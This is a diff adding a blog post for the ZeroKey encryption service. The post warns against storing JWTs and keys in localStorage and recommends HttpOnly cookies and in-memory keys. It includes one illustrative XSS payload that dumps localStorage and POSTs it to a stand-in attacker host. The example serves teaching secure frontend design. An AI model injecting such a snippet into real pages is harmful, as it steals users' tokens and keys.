@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SLS94VX99N"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-SLS94VX99N');
+    </script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Why You Should Never Store JWTs or Secret Keys in localStorage</title>
+    <meta name="description" content="Discover why storing JWTs, API tokens, and encryption keys in localStorage is a critical security vulnerability, and learn the secure alternatives for frontend state.">
+    <meta name="keywords" content="where to store JWT securely, localStorage XSS vulnerability, localStorage vs HttpOnly cookies, store encryption keys browser, secure frontend state management, javascript memory storage, zero-knowledge storage">
+    <meta name="author" content="Dippan Bhusal">
+    <meta name="robots" content="index, follow">
+
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://zerokey.vercel.app/blog/why-never-store-keys-in-localstorage">
+    <meta property="og:title" content="Why You Should Never Store JWTs or Secret Keys in localStorage">
+    <meta property="og:description" content="localStorage is a honeypot for hackers. Learn the secure way to manage sensitive tokens and cryptographic keys in the browser.">
+    
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico">
+    <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon-180x180.png">
+    <meta name="msapplication-TileColor" content="#0f172a">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <link rel="stylesheet" href="/style.css">
+
+    <style>
+        pre[class*="language-"] {
+            background: #020617 !important; /* Tailwind slate-950 */
+            border: 1px solid #1e293b !important; /* Tailwind slate-800 */
+            border-radius: 0.75rem !important;
+            padding: 1.5rem !important;
+            margin: 2em 0 !important;
+            box-shadow: inset 0 2px 4px 0 rgb(0 0 0 / 0.05);
+        }
+        code[class*="language-"], pre[class*="language-"] {
+            font-family: 'JetBrains Mono', monospace !important;
+            font-size: 0.9rem !important;
+            line-height: 1.6 !important;
+        }
+    </style>
+</head>
+<body class="bg-[#0f172a] text-slate-300 min-h-screen font-sans overflow-x-hidden relative selection:bg-amber-500/30">
+    
+    <div class="fixed top-0 left-1/4 w-[500px] h-[500px] bg-amber-600/10 rounded-full blur-[150px] pointer-events-none z-0"></div>
+    <div class="fixed bottom-0 right-1/4 w-[500px] h-[500px] bg-red-600/10 rounded-full blur-[150px] pointer-events-none z-0"></div>
+
+    <nav class="relative z-10 border-b border-slate-800/50 bg-[#0f172a]/80 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2 text-slate-100 font-bold text-2xl tracking-tight">
+                <i class="ph ph-fingerprint text-blue-500"></i> ZeroKey
+            </a>
+            <div class="hidden md:flex gap-6 text-sm font-medium text-slate-400">
+                <a href="/" class="hover:text-white transition-colors">Home</a>
+                <a href="/blog" class="hover:text-white transition-colors text-slate-100">Blog</a>
+                <a href="/status" class="hover:text-white transition-colors">Status</a>
+                <a href="/about" class="hover:text-white transition-colors">About</a>
+            </div>
+            <a href="/encrypt" class="bg-blue-600 hover:bg-blue-500 text-white text-sm font-semibold px-5 py-2 rounded-lg transition-all shadow-[0_0_15px_rgba(37,99,235,0.3)]">
+                Launch Vault
+            </a>
+        </div>
+    </nav>
+
+    <main class="relative z-10 flex-grow py-16 px-4 sm:px-6 lg:px-8">
+        <article class="max-w-3xl mx-auto">
+            
+            <header class="mb-12 border-b border-slate-800 pb-10 text-center">
+                <div class="flex items-center justify-center gap-2 text-amber-400 text-sm font-mono uppercase tracking-widest mb-3">
+                    <i class="ph ph-warning"></i> Architecture Alert
+                </div>
+                <h1 class="text-4xl md:text-6xl font-extrabold text-white mb-6 leading-tight tracking-tight">
+                    Why You Should Never Store JWTs or Keys in localStorage
+                </h1>
+                <div class="flex items-center justify-center gap-6 text-sm text-slate-500 font-medium">
+                    <div class="flex items-center gap-2">
+                        <i class="ph ph-calendar-blank"></i> April 12, 2026
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <i class="ph ph-github-logo"></i> <a href="https://github.com/kdippan" target="_blank" class="hover:text-amber-400 transition-colors">Dippan Bhusal</a>
+                    </div>
+                    <div class="flex items-center gap-2 bg-slate-800 px-3 py-1 rounded-full text-slate-300">
+                        <i class="ph ph-timer"></i> 8 Min Read
+                    </div>
+                </div>
+            </header>
+
+            <div class="prose prose-invert prose-slate max-w-none prose-headings:text-white prose-headings:font-bold prose-a:text-amber-400 prose-a:no-underline hover:prose-a:underline prose-strong:text-slate-100 prose-code:text-emerald-300 prose-li:text-slate-300 text-slate-300 text-lg leading-relaxed space-y-8">
+                
+                <p class="text-xl text-slate-200 leading-relaxed font-medium">
+                    Because the <code class="bg-slate-800 px-1 py-0.5 rounded font-mono text-emerald-300">localStorage</code> API is incredibly easy to use, it has become the default dumping ground for frontend state. Junior developers routinely use it to store JSON Web Tokens (JWTs), OAuth access tokens, and even symmetric encryption keys. 
+                </p>
+                
+                <p>
+                    From a cybersecurity perspective, this is a catastrophic architectural flaw. If you are building a secure web application, treating <code class="font-mono">localStorage</code> as a secure vault is the fastest way to get your users compromised. Here is why, and what you should do instead.
+                </p>
+
+                <h2 class="text-2xl font-bold pt-8">The Vulnerability: Zero XSS Protection</h2>
+                <p>
+                    By design, <code class="font-mono">localStorage</code> is synchronous and globally accessible to <strong class="text-white">any JavaScript executing on the same domain</strong>. 
+                </p>
+                <p>
+                    If your application suffers from a single Cross-Site Scripting (XSS) vulnerability—whether through a malicious NPM package, a compromised third-party analytics script, or improper DOM sanitization—the attacker instantly has full, unhindered access to everything in local storage.
+                </p>
+
+                <h3 class="text-xl font-bold text-red-400 mt-6"><i class="ph-fill ph-bug"></i> The 3-Line Extraction Attack</h3>
+                <p>
+                    If an attacker can execute code on your page, this is all it takes to steal every token, key, and user preference stored in the browser and silently exfiltrate it to a remote server:
+                </p>
+
+<pre><code class="language-javascript">// Malicious script injected via XSS
+const allLoot = JSON.stringify(window.localStorage);
+
+// Silently send the stolen JWTs and AES keys to the attacker's server
+fetch('https://evil-hacker.com/steal', {
+    method: 'POST',
+    body: allLoot
+});
+</code></pre>
+
+                <h2 class="text-2xl font-bold pt-8">The Alternatives: Where Should Data Go?</h2>
+                <p>
+                    Where you store sensitive data depends entirely on what the data is used for. You must separate your strategy into two categories: <strong class="text-white">Authentication Tokens</strong> and <strong class="text-white">Cryptographic Keys</strong>.
+                </p>
+
+                <h3 class="text-xl font-bold text-amber-400 mt-6">1. Authentication (JWTs & Session IDs)</h3>
+                <p>
+                    If a token is only meant to prove to the backend who the user is, your frontend JavaScript <strong class="text-white">does not need to read it</strong>. 
+                </p>
+                <p>
+                    Instead of sending the JWT in a JSON payload and storing it in <code class="font-mono">localStorage</code>, your backend should set it as an <code class="bg-slate-800 px-1 py-0.5 rounded font-mono">HttpOnly; Secure; SameSite=Strict</code> cookie.
+                </p>
+                <ul class="list-disc list-outside pl-6 space-y-3">
+                    <li><strong class="text-white">HttpOnly:</strong> Instructs the browser that JavaScript cannot access the cookie. The 3-line XSS attack above will return nothing.</li>
+                    <li><strong class="text-white">Secure:</strong> Ensures the token is only transmitted over HTTPS.</li>
+                    <li>The browser will automatically attach this cookie to future API requests. Your JavaScript code never touches it.</li>
+                </ul>
+
+                <h3 class="text-xl font-bold text-amber-400 mt-6">2. Cryptographic Keys (AES & Web Crypto)</h3>
+                <p>
+                    In an End-to-End Encrypted (E2EE) application, the frontend JavaScript *must* have access to the decryption key to perform the local math. You cannot use HttpOnly cookies here, because the JavaScript needs the raw bytes.
+                </p>
+                <p>
+                    The solution is <strong class="text-white">Ephemeral In-Memory Storage</strong>. Keys should only exist as scoped variables (closures) inside your application's memory heap during the exact moment they are needed.
+                </p>
+
+<pre><code class="language-javascript">// ✅ SECURE: The key is kept strictly in memory memory
+async function decryptSecurePayload() {
+    // Extract key from the URL fragment (not localStorage)
+    const ephemeralKeyString = window.location.hash.substring(1);
+    
+    // Derive the CryptoKey object
+    const cryptoKey = await deriveKeyFromHash(ephemeralKeyString);
+    
+    // Perform the decryption
+    const plaintext = await crypto.subtle.decrypt(..., cryptoKey, ...);
+    
+    // As soon as this function finishes executing, 'ephemeralKeyString' 
+    // and 'cryptoKey' fall out of scope and are garbage collected.
+    // An XSS payload executing 5 seconds later will find nothing.
+    
+    renderToDOM(plaintext);
+}
+</code></pre>
+
+                <div class="glass-panel p-8 rounded-2xl border-2 border-amber-600/50 bg-amber-950/20 backdrop-blur-md my-12 relative overflow-hidden group hover:border-amber-500/80 transition-all">
+                    <div class="absolute -top-10 -right-10 p-6 opacity-10 group-hover:opacity-20 transition-opacity">
+                        <i class="ph-fill ph-trash text-[160px] text-amber-500"></i>
+                    </div>
+                    <div class="relative z-10">
+                        <h3 class="text-2xl font-bold text-white mb-3">Zero-Retention Architecture</h3>
+                        <p class="text-slate-300 mb-6 leading-relaxed max-w-xl">
+                            When building <strong class="text-amber-400">ZeroKey</strong>, we adopted a strict zero-retention policy for both the backend database and the frontend browser. 
+                        </p>
+                        <p class="text-slate-400 mb-6 text-sm">
+                            If you inspect the Application tab in DevTools while using ZeroKey, you will notice <code class="font-mono">localStorage</code>, <code class="font-mono">sessionStorage</code>, and <code class="font-mono">IndexedDB</code> are completely empty. Keys live purely in the URL fragment and ephemeral memory, making offline extraction impossible.
+                        </p>
+                        <div class="flex gap-4 flex-wrap">
+                            <a href="/encrypt" class="bg-amber-600 hover:bg-amber-500 text-white font-semibold px-6 py-3 rounded-xl transition-all shadow-[0_0_20px_rgba(245,158,11,0.3)] inline-flex items-center gap-2 text-base">
+                                <i class="ph ph-shield-check"></i> Test the Ephemeral Vault
+                            </a>
+                            <a href="https://github.com/kdippan/zerokey" target="_blank" class="bg-slate-800 hover:bg-slate-700 text-white font-semibold px-6 py-3 rounded-xl transition-all border border-slate-700 inline-flex items-center gap-2 text-base">
+                                <i class="ph ph-github-logo"></i> Audit the Codebase
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <h2 class="text-2xl font-bold pt-8">Conclusion</h2>
+                <p>
+                    Convenience is the enemy of security. While <code class="font-mono text-emerald-300">localStorage.setItem()</code> is incredibly easy to type, it leaves your users' most sensitive data sitting in plain sight. Lock your authentication tokens in HttpOnly cookies, and keep your encryption keys floating dynamically in transient memory.
+                </p>
+
+            </div>
+            
+            <footer class="mt-16 border-t border-slate-800 pt-10">
+                <div class="flex items-center justify-between gap-6 bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-inner flex-wrap">
+                    <div class="flex items-center gap-4">
+                        <div class="p-3 bg-slate-800 rounded-full border border-slate-700 text-amber-400 text-2xl">
+                            <i class="ph-fill ph-terminal-window"></i>
+                        </div>
+                        <div>
+                            <p class="text-white font-semibold">About the Author</p>
+                            <p class="text-sm text-slate-400">Dippan Bhusal is a developer focused on secure full-stack architecture and zero-knowledge systems.</p>
+                        </div>
+                    </div>
+                    <a href="https://github.com/kdippan" target="_blank" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center gap-2">
+                        <i class="ph ph-github-logo text-lg"></i> View GitHub
+                    </a>
+                </div>
+            </footer>
+
+        </article>
+    </main>
+
+    <footer class="border-t border-slate-800/50 bg-[#0f172a] relative z-10 pt-10 pb-8 mt-auto w-full">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-xs text-slate-600">
+            <p>&copy; 2026 ZeroKey. Built for digital privacy by <a href="https://github.com/kdippan" target="_blank" class="text-amber-400 hover:text-amber-300">Dippan Bhusal</a>.</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+</body>
+</html>
